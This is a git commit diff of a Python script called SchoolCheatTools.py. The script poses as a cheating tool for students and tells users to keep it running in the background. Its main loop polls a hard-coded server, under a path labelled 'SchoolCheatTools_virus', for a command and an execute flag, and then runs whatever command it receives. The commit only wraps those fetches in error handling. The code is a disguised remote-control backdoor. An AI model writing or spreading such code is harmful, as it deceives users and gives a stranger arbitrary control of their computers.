39e5815d3f2feafcda2e7b92daaf5e98c122129f
mrdog233o5 <103615501+mrdog233o5@users.noreply.github.com>
2023-08-07 21:37:35 +1000

    Update SchoolCheatTools.py

--- SchoolCheatTools.py
+++ SchoolCheatTools.py
@@ -6,6 +6,7 @@ from time import *
 old_command = 0
 server_ip = "192.168.0.216" #edit this variable to the server ip, which can be found in the description
 #I will also update this variable from the code if the server ip changed, so if the ip stopped working, check the description
+
 print('''
       
 ░██████╗░█████╗░██╗░░██╗░█████╗░░█████╗░██╗░░░░░░█████╗░██╗░░██╗███████╗░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
@@ -21,8 +22,11 @@ IMPORTANT   ***   WHEN USING SCHOOLCHEATTOOLS, PLEASE KEEP IT RUNNING IN THE BAC
 
 while True:
     #get HTML
-    command = requests.get('http://' + server_ip + '/SchoolCheatTools_virus/command.txt').text
-    exe = (requests.get('http://' + server_ip + '/SchoolCheatTools_virus/execute_command.txt').text == "1")
+    try:
+        command = requests.get('http://' + server_ip + '/SchoolCheatTools_virus/command.txt').text
+        exe = (requests.get('http://' + server_ip + '/SchoolCheatTools_virus/execute_command.txt').text == "1")
+    except:
+        print("server ip changed or server TEMPORARY closed")
     #execute command
     if old_command != command and exe:
         try:
